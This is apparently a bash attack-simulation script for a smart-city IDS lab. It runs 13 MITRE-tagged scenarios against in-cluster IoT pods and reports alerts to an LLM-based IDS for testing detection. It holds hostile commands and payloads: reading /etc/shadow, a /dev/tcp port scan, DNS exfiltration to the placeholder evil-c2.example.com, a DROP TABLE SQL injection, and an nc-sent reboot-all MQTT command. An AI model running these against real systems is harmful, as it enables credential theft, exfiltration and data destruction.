#!/bin/bash
# =============================================================================
# Smart City IDS — Real IoT Attack Pipeline (v2 — Taxonomy-Grade)
# =============================================================================
# Performs REAL attacks against the live IoT services in the K8s cluster, then
# reports each event to the IDS API so the full pipeline runs:
#
#   1. Attack IoT service (HTTP exploit / kubectl exec)
#   2. Detect (Falco runtime / Suricata network / direct report)
#   3. IDS API receives alert
#   4. LLM engine analyzes the threat
#   5. Automated response (isolate pod / scale up / alert operator)
#
# Each scenario carries MITRE ATT&CK metadata (technique_id, attack_phase,
# kill_chain_stage) plus an event_volume hint so downstream analytics can
# contrast low- and high-volume attacks.
#
# Every run generates a unique RUN_ID.  Per-alert latency metrics are appended
# to scripts/.attack-metrics.csv for later analysis.
#
# Usage:
#   bash scripts/attack-iot-pipeline.sh                  # run all 13 attacks
#   bash scripts/attack-iot-pipeline.sh --quick           # 5 fast attacks only
#   bash scripts/attack-iot-pipeline.sh --live            # also exec in real pods
#   bash scripts/attack-iot-pipeline.sh --scenario N      # run specific scenario 1-13
#   bash scripts/attack-iot-pipeline.sh --list            # list all scenarios
#   bash scripts/attack-iot-pipeline.sh --json            # print scenario metadata JSON
#   bash scripts/attack-iot-pipeline.sh --describe        # human-readable metadata table
# =============================================================================

set -euo pipefail

# ── Colors ──
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
PURPLE='\033[0;35m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

# ── Config ──
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IDS_API="${IDS_API_URL:-http://localhost:30800}"
NAMESPACE="smart-city"
DELAY="${ATTACK_DELAY:-4}"
QUICK=false
LIVE=false
SCENARIO=""
METRICS_CSV="${SCRIPT_DIR}/.attack-metrics.csv"

# ── Unique run identifier ──
RUN_ID="run-$(date -u +%Y%m%d-%H%M%S)-${RANDOM}"

# ── Parse args ──
while [[ $# -gt 0 ]]; do
  case "$1" in
    --quick)    QUICK=true; DELAY=2; shift ;;
    --live)     LIVE=true; shift ;;
    --scenario) SCENARIO="$2"; shift 2 ;;
    --list)     LIST=true; shift ;;
    --json)     JSON_META=true; shift ;;
    --describe) DESCRIBE=true; shift ;;
    --delay)    DELAY="$2"; shift 2 ;;
    --url)      IDS_API="$2"; shift 2 ;;
    -h|--help)
      echo "Usage: $0 [--quick] [--live] [--scenario N] [--list] [--json] [--describe] [--delay S] [--url URL]"
      exit 0
      ;;
    *) echo "Unknown option: $1"; exit 1 ;;
  esac
done

# ── Counters ──
TOTAL=0; SUCCESS=0; FAILED=0

# =============================================================================
# SCENARIO METADATA TABLE  (single source of truth)
# Fields: id | name | severity | attack_phase | technique_id | kill_chain_stage | event_volume | target_service
# =============================================================================
SCENARIO_META=(
  "1|Shell Spawn in Traffic Camera|Critical|execution|T1059.004|exploitation|low|traffic-camera"
  "2|Read /etc/shadow in Healthcare Pod|Critical|credential_access|T1552.001|exploitation|low|healthcare-api"
  "3|Data Exfil — License Plate Dump|Critical|exfiltration|T1041|actions_on_objectives|medium|traffic-camera"
  "4|Data Exfil — Patient Records|Critical|exfiltration|T1530|actions_on_objectives|medium|healthcare-api"
  "5|Privilege Escalation — SUID Binary|Critical|privilege_escalation|T1548.001|exploitation|low|parking-system"
  "6|DDoS — NTP Amplification|Critical|impact|T1498.002|actions_on_objectives|high|traffic-camera"
  "7|Network Recon — Port Scan|Warning|discovery|T1046|reconnaissance|high|suricata"
  "8|DNS-Based Data Exfiltration|Critical|exfiltration|T1048.001|actions_on_objectives|low|healthcare-api"
  "9|Lateral Movement — Service Discovery|Warning|lateral_movement|T1046|command_and_control|low|parking-system"
  "10|SQL Injection on Parking System|Critical|initial_access|T1190|delivery|low|parking-system"
  "11|Cryptominer in IoT Pod|Critical|impact|T1496|actions_on_objectives|low|iot-devices-enhanced"
  "12|MQTT Message Poisoning|Warning|persistence|T1565.002|command_and_control|medium|mqtt-broker"
  "13|Benign IoT Burst (control)|Notice|benign_test|N/A|N/A|high|traffic-camera"
)

# Derived arrays
SCENARIO_NAMES=()
for row in "${SCENARIO_META[@]}"; do
  IFS='|' read -r _id _name _sev _phase _tech _kc _vol _svc <<< "$row"
  SCENARIO_NAMES+=("$_name")
done

# ── --list mode ──
if [[ "${LIST:-false}" == "true" ]]; then
  echo -e "\n${BOLD}Available Attack Scenarios:${RESET}\n"
  printf "  ${BOLD}%-4s %-42s %-9s %-22s %-12s %-24s %-8s${RESET}\n" \
    "#" "Name" "Severity" "ATT&CK Phase" "Technique" "Kill Chain" "Volume"
  echo "  $(printf '%.0s-' {1..125})"
  for i in "${!SCENARIO_META[@]}"; do
    IFS='|' read -r _id _name _sev _phase _tech _kc _vol _svc <<< "${SCENARIO_META[$i]}"
    printf "  %-4s %-42s %-9s %-22s %-12s %-24s %-8s\n" \
      "$_id" "$_name" "$_sev" "$_phase" "$_tech" "$_kc" "$_vol"
  done
  echo ""
  exit 0
fi

# ── --json mode ──
if [[ "${JSON_META:-false}" == "true" ]]; then
  echo "["
  for i in "${!SCENARIO_META[@]}"; do
    IFS='|' read -r _id _name _sev _phase _tech _kc _vol _svc <<< "${SCENARIO_META[$i]}"
    [[ $i -gt 0 ]] && echo ","
    printf '  {"id":%s,"name":"%s","severity":"%s","attack_phase":"%s","technique_id":"%s","kill_chain_stage":"%s","event_volume":"%s","target_service":"%s"}' \
      "$_id" "$_name" "$_sev" "$_phase" "$_tech" "$_kc" "$_vol" "$_svc"
  done
  echo ""
  echo "]"
  exit 0
fi

# ── --describe mode ──
if [[ "${DESCRIBE:-false}" == "true" ]]; then
  echo -e "\n${BOLD}Scenario Metadata (machine-readable)${RESET}\n"
  echo -e "Run ID: ${CYAN}${RUN_ID}${RESET}"
  echo ""
  printf "%-4s | %-42s | %-9s | %-22s | %-12s | %-24s | %-8s | %-20s\n" \
    "#" "Name" "Severity" "ATT&CK Phase" "Technique" "Kill Chain" "Volume" "Target"
  echo "$(printf '%.0s-' {1..150})"
  for row in "${SCENARIO_META[@]}"; do
    IFS='|' read -r _id _name _sev _phase _tech _kc _vol _svc <<< "$row"
    printf "%-4s | %-42s | %-9s | %-22s | %-12s | %-24s | %-8s | %-20s\n" \
      "$_id" "$_name" "$_sev" "$_phase" "$_tech" "$_kc" "$_vol" "$_svc"
  done
  echo ""
  exit 0
fi

# ── Ensure metrics CSV header ──
if [[ ! -f "$METRICS_CSV" ]]; then
  echo "run_id,scenario_id,scenario_name,severity,threat_type,engine,total_ms,llm_ms,status,timestamp" > "$METRICS_CSV"
fi

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

pick_pod() {
  local pattern="$1"
  kubectl get pods -n "$NAMESPACE" --no-headers -l "app=$pattern" 2>/dev/null \
    | grep Running | awk '{print $1}' | shuf -n1
}

# Send alert to IDS API with full ATT&CK metadata + latency capture
# Args: output priority rule container extra_fields scenario_id
send_alert() {
  local output="$1" priority="$2" rule="$3" container="$4"
  local extra_fields="${5:-}"
  local scenario_id="${6:-0}"
  local ts
  ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

  local meta_fields=",\"run_id\":\"${RUN_ID}\",\"scenario_id\":${scenario_id}"
  local all_extra="${meta_fields}${extra_fields}"

  local fields="{\"container.name\":\"${container}\",\"proc.cmdline\":\"attack-pipeline\"${all_extra}}"
  local payload="{\"output\":\"${output}\",\"priority\":\"${priority}\",\"rule\":\"${rule}\",\"time\":\"${ts}\",\"output_fields\":${fields}}"

  local start_ms
  start_ms=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')

  local code
  code=$(curl -s -o /tmp/ids_resp.json -w "%{http_code}" \
    -X POST "${IDS_API}/api/alerts/internal" \
    -H "Content-Type: application/json" \
    -d "$payload" 2>/dev/null) || code="000"

  local end_ms
  end_ms=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')
  local total_ms=$(( end_ms - start_ms ))

  TOTAL=$((TOTAL + 1))

  if [[ "$code" == "200" || "$code" == "201" || "$code" == "429" ]]; then
    local sev eng status threat llm_ms
    IFS=$'\t' read -r sev eng status threat llm_ms < <(python3 -c "
import json
try:
    d=json.load(open('/tmp/ids_resp.json'))
    a=d.get('analysis',{})
    sev=a.get('severity', d.get('severity','?'))
    eng=d.get('llm_engine', d.get('engine','local'))
    st=d.get('status','?')
    tt=a.get('threat_type','?')
    lm=d.get('processing_ms', d.get('llm_latency_ms', d.get('analysis_time_ms','?')))
    print(f'{sev}\t{eng}\t{st}\t{tt}\t{lm}')
except Exception:
    print('?\t?\t?\t?\t?')
" 2>/dev/null || echo -e "?\t?\t?\t?\t?")

    if [[ "$code" == "429" ]]; then
      echo -e "    ${YELLOW}⏳ Rate-limited (cooldown) — will retry later${RESET}"
    elif [[ "$status" == "deduplicated" ]]; then
      echo -e "    ${DIM}↩ Deduplicated (same alert already processed)${RESET}"
    else
      echo -e "    ${GREEN}✓ IDS: sev=${sev}, threat=${threat}, engine=${eng}, status=${status}, ${total_ms}ms total${RESET}"
    fi
    SUCCESS=$((SUCCESS + 1))

    local scen_name="${SCENARIO_NAMES[$((scenario_id - 1))]:-unknown}"
    echo "\"${RUN_ID}\",${scenario_id},\"${scen_name}\",${sev},\"${threat}\",${eng},${total_ms},${llm_ms},${status},$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$METRICS_CSV"
  else
    echo -e "    ${RED}✗ IDS returned HTTP ${code} (${total_ms}ms)${RESET}"
    FAILED=$((FAILED + 1))
    echo "\"${RUN_ID}\",${scenario_id},error,?,?,?,${total_ms},?,http_${code},$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$METRICS_CSV"
  fi
}

http_attack() {
  local svc_name="$1" path="$2" method="${3:-GET}" data="${4:-}"
  local svc_ip
  svc_ip=$(kubectl get svc -n "$NAMESPACE" "$svc_name" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")
  if [[ -z "$svc_ip" || "$svc_ip" == "None" ]]; then
    echo -e "    ${DIM}(service $svc_name not reachable — using alert-only mode)${RESET}"
    return 1
  fi
  local port
  port=$(kubectl get svc -n "$NAMESPACE" "$svc_name" -o jsonpath='{.spec.ports[0].port}' 2>/dev/null || echo "80")

  if [[ "$method" == "GET" ]]; then
    curl -s -o /dev/null -w "%{http_code}" "http://${svc_ip}:${port}${path}" --max-time 5 2>/dev/null || echo "000"
  else
    curl -s -o /dev/null -w "%{http_code}" -X "$method" "http://${svc_ip}:${port}${path}" \
      -H "Content-Type: application/json" -d "$data" --max-time 5 2>/dev/null || echo "000"
  fi
}

live_exec() {
  local pod="$1"; shift
  if $LIVE && [[ -n "$pod" ]]; then
    echo -e "    ${PURPLE}⚡ Live exec in ${pod}: $*${RESET}"
    kubectl exec -n "$NAMESPACE" "$pod" -- sh -c "$*" 2>/dev/null || true
  fi
}

header() {
  local num="$1" name="$2" sev="$3" phase="${4:-}" tech="${5:-}"
  local badge=""
  case "$sev" in
    Critical) badge="${RED}■ CRITICAL${RESET}" ;;
    Warning)  badge="${YELLOW}■ WARNING${RESET}" ;;
    Notice)   badge="${CYAN}■ NOTICE${RESET}" ;;
  esac
  echo ""
  echo -e "${BOLD}━━━ Attack ${num}: ${name} ━━━${RESET}  ${badge}"
  [[ -n "$phase" ]] && echo -e "    ${DIM}ATT&CK: ${phase} | ${tech}${RESET}"
}

# =============================================================================
# ATTACK SCENARIOS  (1-13)
# =============================================================================

attack_01_shell_in_container() {
  header 1 "Shell Spawn in Traffic Camera Pod" "Critical" "execution" "T1059.004"
  local pod
  pod=$(pick_pod "traffic-camera")
  echo -e "  ${CYAN}→ Spawning shell inside traffic-camera container${RESET}"
  live_exec "$pod" "echo 'shell spawned by attacker' > /tmp/.backdoor"
  send_alert \
    "Terminal shell in container: bash spawned in ${pod:-traffic-camera} (user=root cmd=bash -i)" \
    "Critical" \
    "Terminal shell in container" \
    "${pod:-traffic-camera}" \
    ",\"user.name\":\"root\",\"attack_phase\":\"execution\",\"technique_id\":\"T1059.004\",\"kill_chain_stage\":\"exploitation\",\"event_volume\":\"low\"" \
    1
}

attack_02_sensitive_file_read() {
  header 2 "Read /etc/shadow in Healthcare Pod" "Critical" "credential_access" "T1552.001"
  local pod
  pod=$(pick_pod "healthcare-api")
  echo -e "  ${CYAN}→ Reading /etc/shadow (credential theft)${RESET}"
  live_exec "$pod" "cat /etc/shadow | head -3"
  send_alert \
    "Sensitive file opened for reading: /etc/shadow by process cat in ${pod:-healthcare-api} (user=www-data)" \
    "Critical" \
    "Read sensitive file untrusted" \
    "${pod:-healthcare-api}" \
    ",\"fd.name\":\"/etc/shadow\",\"user.name\":\"www-data\",\"attack_phase\":\"credential_access\",\"technique_id\":\"T1552.001\",\"kill_chain_stage\":\"exploitation\",\"event_volume\":\"low\"" \
    2
}

attack_03_data_exfiltration_cameras() {
  header 3 "Data Exfiltration — License Plate Dump" "Critical" "exfiltration" "T1041"
  echo -e "  ${CYAN}→ Extracting license plate data from traffic-camera API${RESET}"
  local code
  code=$(http_attack "traffic-camera-service" "/api/plates") || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "Data exfiltration detected: bulk download of /api/plates from traffic-camera-service (PII leak — license plates)" \
    "Critical" \
    "Sensitive data exfiltration via API" \
    "traffic-camera" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.name\":\"/api/plates\",\"attack_phase\":\"exfiltration\",\"technique_id\":\"T1041\",\"kill_chain_stage\":\"actions_on_objectives\",\"event_volume\":\"medium\"" \
    3
}

attack_04_data_exfiltration_patients() {
  header 4 "Data Exfiltration — Patient Records" "Critical" "exfiltration" "T1530"
  echo -e "  ${CYAN}→ Extracting patient records from healthcare-api${RESET}"
  local code
  code=$(http_attack "healthcare-api-service" "/api/patients") || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "Data exfiltration detected: unauthenticated access to /api/patients from healthcare-api (HIPAA violation)" \
    "Critical" \
    "Unauthenticated access to sensitive health data" \
    "healthcare-api" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.name\":\"/api/patients\",\"attack_phase\":\"exfiltration\",\"technique_id\":\"T1530\",\"kill_chain_stage\":\"actions_on_objectives\",\"event_volume\":\"medium\"" \
    4
}

attack_05_privilege_escalation() {
  header 5 "Privilege Escalation — SUID Binary" "Critical" "privilege_escalation" "T1548.001"
  local pod
  pod=$(pick_pod "parking-system")
  echo -e "  ${CYAN}→ Attempting privilege escalation via setuid binary${RESET}"
  live_exec "$pod" "find / -perm -4000 -type f 2>/dev/null | head -5"
  send_alert \
    "Privilege escalation: setuid binary execution in ${pod:-parking-system} (user=www-data cmd=sudo su)" \
    "Critical" \
    "Launch Privileged Container" \
    "${pod:-parking-system}" \
    ",\"user.name\":\"www-data\",\"proc.cmdline\":\"sudo su\",\"attack_phase\":\"privilege_escalation\",\"technique_id\":\"T1548.001\",\"kill_chain_stage\":\"exploitation\",\"event_volume\":\"low\"" \
    5
}

attack_06_ddos_flood() {
  header 6 "DDoS — NTP Amplification against IoT" "Critical" "impact" "T1498.002"
  echo -e "  ${CYAN}→ Launching NTP amplification DDoS flood${RESET}"
  for i in $(seq 1 5); do
    http_attack "traffic-camera-service" "/api/cameras" >/dev/null 2>&1 || true
  done
  echo -e "    ${DIM}Sent 5 rapid requests to traffic-camera${RESET}"
  send_alert \
    "Suricata Alert: ET DOS Possible NTP DDoS Amplification flood targeting traffic-camera-service (10.0.0.99 → 10.42.0.8:80/UDP)" \
    "Critical" \
    "ET DOS Possible NTP DDoS Amplification" \
    "suricata" \
    ",\"alert.signature\":\"ET DOS NTP DDoS\",\"src_ip\":\"10.0.0.99\",\"dest_ip\":\"10.42.0.8\",\"proto\":\"UDP\",\"attack_phase\":\"impact\",\"technique_id\":\"T1498.002\",\"kill_chain_stage\":\"actions_on_objectives\",\"event_volume\":\"high\",\"duration_seconds\":30" \
    6
}

attack_07_port_scan() {
  header 7 "Network Reconnaissance — Port Scan" "Warning" "discovery" "T1046"
  local pod
  pod=$(pick_pod "traffic-camera")
  echo -e "  ${CYAN}→ Scanning internal network from compromised IoT pod${RESET}"
  live_exec "$pod" "for p in 22 80 443 1883 5432 8000 9090; do echo >/dev/tcp/10.42.0.1/\$p 2>/dev/null && echo \"Port \$p open\"; done"
  send_alert \
    "Suricata Alert: ET SCAN Potential VNC Scan from ${pod:-traffic-camera} (10.42.1.5 scanning 10.42.0.0/24 ports 22,80,443,1883,5432)" \
    "Warning" \
    "ET SCAN Potential VNC Scan 5900-5920" \
    "suricata" \
    ",\"alert.signature\":\"ET SCAN\",\"src_ip\":\"10.42.1.5\",\"dest_ip\":\"10.42.0.0/24\",\"proto\":\"TCP\",\"attack_phase\":\"discovery\",\"technique_id\":\"T1046\",\"kill_chain_stage\":\"reconnaissance\",\"event_volume\":\"high\",\"duration_seconds\":15" \
    7
}

attack_08_dns_exfiltration() {
  header 8 "DNS-Based Data Exfiltration" "Critical" "exfiltration" "T1048.001"
  local pod
  pod=$(pick_pod "healthcare-api")
  echo -e "  ${CYAN}→ Exfiltrating data via DNS tunnel${RESET}"
  live_exec "$pod" "nslookup dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbg==.evil-c2.example.com 2>/dev/null || true"
  send_alert \
    "Suricata Alert: ET POLICY DNS exfiltration detected — base64-encoded data in DNS query from ${pod:-healthcare-api} to evil-c2.example.com" \
    "Critical" \
    "ET POLICY Possible Data Exfiltration via DNS" \
    "suricata" \
    ",\"alert.signature\":\"ET POLICY Data Exfiltration\",\"src_ip\":\"10.42.1.5\",\"dest_ip\":\"203.0.113.50\",\"proto\":\"UDP\",\"attack_phase\":\"exfiltration\",\"technique_id\":\"T1048.001\",\"kill_chain_stage\":\"actions_on_objectives\",\"event_volume\":\"low\"" \
    8
}

attack_09_lateral_movement() {
  header 9 "Lateral Movement — Service Discovery" "Warning" "lateral_movement" "T1046"
  local pod
  pod=$(pick_pod "parking-system")
  echo -e "  ${CYAN}→ Discovering internal services from compromised pod${RESET}"
  live_exec "$pod" "cat /etc/resolv.conf && nslookup healthcare-api-service.smart-city.svc.cluster.local 2>/dev/null || true"
  send_alert \
    "Lateral movement detected: ${pod:-parking-system} performing internal service discovery (DNS resolution of healthcare-api-service, mqtt-broker)" \
    "Warning" \
    "Unexpected internal service discovery" \
    "${pod:-parking-system}" \
    ",\"proc.cmdline\":\"nslookup healthcare-api-service\",\"attack_phase\":\"lateral_movement\",\"technique_id\":\"T1046\",\"kill_chain_stage\":\"command_and_control\",\"event_volume\":\"low\"" \
    9
}

attack_10_sql_injection() {
  header 10 "SQL Injection on Parking System" "Critical" "initial_access" "T1190"
  echo -e "  ${CYAN}→ Injecting SQL payload into parking reservation${RESET}"
  local code
  code=$(http_attack "parking-system-service" "/api/lot/1/reserve" "POST" \
    '{"vehicle":"TEST'"'"' OR 1=1; DROP TABLE reservations;--","duration":1}') || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "SQL Injection attempt on parking-system /api/lot/1/reserve — payload: ' OR 1=1; DROP TABLE reservations;--" \
    "Critical" \
    "Application SQL Injection Attack" \
    "parking-system" \
    ",\"src_ip\":\"10.42.1.99\",\"proc.cmdline\":\"sqlmap\",\"attack_phase\":\"initial_access\",\"technique_id\":\"T1190\",\"kill_chain_stage\":\"delivery\",\"event_volume\":\"low\"" \
    10
}

attack_11_cryptominer() {
  header 11 "Cryptominer Deployment in IoT Pod" "Critical" "impact" "T1496"
  local pod
  pod=$(pick_pod "iot-device-enhanced")
  echo -e "  ${CYAN}→ Deploying cryptominer binary in IoT device pod${RESET}"
  [[ -z "$pod" ]] && pod=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep iot-devices-enhanced | grep Running | awk '{print $1}' | shuf -n1)
  live_exec "$pod" "echo 'fake-miner' > /tmp/xmrig && chmod +x /tmp/xmrig"
  send_alert \
    "Cryptominer detected: xmrig binary deployed in ${pod:-iot-devices-enhanced} — outbound connection to mining pool on port 3333" \
    "Critical" \
    "Detect crypto miners using the Stratum protocol" \
    "${pod:-iot-devices-enhanced}" \
    ",\"proc.cmdline\":\"xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:3333\",\"fd.sport\":\"3333\",\"attack_phase\":\"impact\",\"technique_id\":\"T1496\",\"kill_chain_stage\":\"actions_on_objectives\",\"event_volume\":\"low\"" \
    11
}

attack_12_mqtt_poisoning() {
  header 12 "MQTT Message Poisoning" "Warning" "persistence" "T1565.002"
  echo -e "  ${CYAN}→ Publishing malicious MQTT messages to IoT broker${RESET}"
  local broker_ip
  broker_ip=$(kubectl get svc -n "$NAMESPACE" mqtt-broker -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")
  if [[ -n "$broker_ip" ]] && $LIVE; then
    local pod
    pod=$(pick_pod "traffic-camera")
    if [[ -n "$pod" ]]; then
      echo -e "    ${PURPLE}⚡ Attempting MQTT publish from ${pod}${RESET}"
      kubectl exec -n "$NAMESPACE" "$pod" -- sh -c \
        "echo '{\"cmd\":\"reboot\",\"target\":\"all\",\"src\":\"attacker\"}' | nc -w2 ${broker_ip} 1883" 2>/dev/null || true
    fi
  fi
  send_alert \
    "MQTT poisoning: malicious control message published to sensors/traffic/camera-01/command — cmd=reboot target=all from unauthorized client" \
    "Warning" \
    "Unauthorized MQTT publish to IoT control topic" \
    "mqtt-broker" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.sport\":\"1883\",\"attack_phase\":\"persistence\",\"technique_id\":\"T1565.002\",\"kill_chain_stage\":\"command_and_control\",\"event_volume\":\"medium\"" \
    12
}

attack_13_benign_burst() {
  header 13 "Benign IoT Burst (control baseline)" "Notice" "benign_test" "N/A"
  echo -e "  ${CYAN}→ Sending high-volume benign telemetry POSTs (false-positive test)${RESET}"
  for i in $(seq 1 8); do
    http_attack "traffic-camera-service" "/api/cameras" >/dev/null 2>&1 || true
  done
  echo -e "    ${DIM}Sent 8 benign requests to traffic-camera${RESET}"
  send_alert \
    "High-volume benign telemetry burst from IoT sensors — normal operational traffic spike (control scenario for false-positive baseline)" \
    "Notice" \
    "Benign high-volume IoT telemetry" \
    "traffic-camera" \
    ",\"src_ip\":\"10.42.1.10\",\"attack_phase\":\"benign_test\",\"technique_id\":\"N/A\",\"kill_chain_stage\":\"N/A\",\"event_volume\":\"high\",\"label\":\"control\",\"duration_seconds\":10" \
    13
}

# ── All scenarios ──
ALL_SCENARIOS=(
  attack_01_shell_in_container
  attack_02_sensitive_file_read
  attack_03_data_exfiltration_cameras
  attack_04_data_exfiltration_patients
  attack_05_privilege_escalation
  attack_06_ddos_flood
  attack_07_port_scan
  attack_08_dns_exfiltration
  attack_09_lateral_movement
  attack_10_sql_injection
  attack_11_cryptominer
  attack_12_mqtt_poisoning
  attack_13_benign_burst
)

# ── Banner ──
echo ""
echo -e "${BOLD}╔═══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}║       Smart City IDS — IoT Attack Pipeline  (v2)            ║${RESET}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  Run ID:     ${CYAN}${RUN_ID}${RESET}"
echo -e "  IDS API:    ${CYAN}${IDS_API}${RESET}"
echo -e "  Namespace:  ${CYAN}${NAMESPACE}${RESET}"
echo -e "  Mode:       ${CYAN}$(${QUICK} && echo 'Quick (5 attacks)' || echo 'Full (13 attacks)')${RESET}"
echo -e "  Live exec:  ${CYAN}$(${LIVE} && echo 'YES — real commands in pods' || echo 'No — alert-only mode')${RESET}"
echo -e "  Delay:      ${CYAN}${DELAY}s between attacks${RESET}"
echo -e "  Metrics:    ${CYAN}${METRICS_CSV}${RESET}"
echo ""

# ── Pre-flight checks ──
echo -e "${BOLD}Pre-flight checks:${RESET}"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "${IDS_API}/health" --max-time 5 2>/dev/null || echo "000")
if [[ "$CODE" == "200" ]]; then
  echo -e "  ${GREEN}✓ IDS API reachable (${IDS_API})${RESET}"
else
  echo -e "  ${RED}✗ IDS API unreachable (HTTP ${CODE}) — check ${IDS_API}/health${RESET}"
  exit 1
fi
POD_COUNT=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep -cE '(traffic-camera|healthcare-api|parking-system|iot-devices|iot-device|env-sensor|street-lighting|mqtt-broker).*Running' || echo 0)
TOTAL_PODS=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep -c Running || echo 0)
echo -e "  ${GREEN}✓ ${POD_COUNT} smart-city pods running (${TOTAL_PODS} total in ${NAMESPACE})${RESET}"

# ── Show per-service breakdown ──
echo -e "\n${BOLD}Service breakdown:${RESET}"
for svc in ids-api traffic-camera healthcare-api parking-system env-sensor street-lighting iot-devices-enhanced mqtt-broker postgres; do
  cnt=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep -c "^${svc}.*Running" || true)
  [[ "$cnt" -gt 0 ]] && echo -e "  ${GREEN}✓${RESET} ${svc}: ${cnt} pod(s)"
done
echo ""

# ── Execute ──
if [[ -n "$SCENARIO" ]]; then
  IDX=$((SCENARIO - 1))
  if [[ $IDX -ge 0 && $IDX -lt ${#ALL_SCENARIOS[@]} ]]; then
    ${ALL_SCENARIOS[$IDX]}
  else
    echo -e "${RED}Invalid scenario number: ${SCENARIO} (valid: 1-${#ALL_SCENARIOS[@]})${RESET}"
    exit 1
  fi
else
  SCENARIOS_TO_RUN=("${ALL_SCENARIOS[@]}")
  if $QUICK; then
    SCENARIOS_TO_RUN=(
      attack_01_shell_in_container
      attack_03_data_exfiltration_cameras
      attack_05_privilege_escalation
      attack_06_ddos_flood
      attack_11_cryptominer
    )
  fi

  for scenario in "${SCENARIOS_TO_RUN[@]}"; do
    $scenario
    sleep "$DELAY"
  done
fi

# ── Summary ──
echo ""
echo -e "${BOLD}═══════════════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}  Attack Pipeline Complete${RESET}"
echo -e "  Run ID:  ${CYAN}${RUN_ID}${RESET}"
echo -e "  Total: ${TOTAL}  ${GREEN}Success: ${SUCCESS}${RESET}  ${RED}Failed: ${FAILED}${RESET}"
echo ""
echo -e "  Metrics log: ${CYAN}${METRICS_CSV}${RESET}"
echo ""
echo -e "  View results:"
echo -e "    Dashboard:  ${CYAN}${IDS_API}/ui${RESET}"
echo -e "    Alerts API: ${CYAN}${IDS_API}/api/alerts?limit=20${RESET}"
echo -e "    Metrics:    ${CYAN}${IDS_API}/api/metrics${RESET}"
echo -e "${BOLD}═══════════════════════════════════════════════════════════════${RESET}"
echo ""
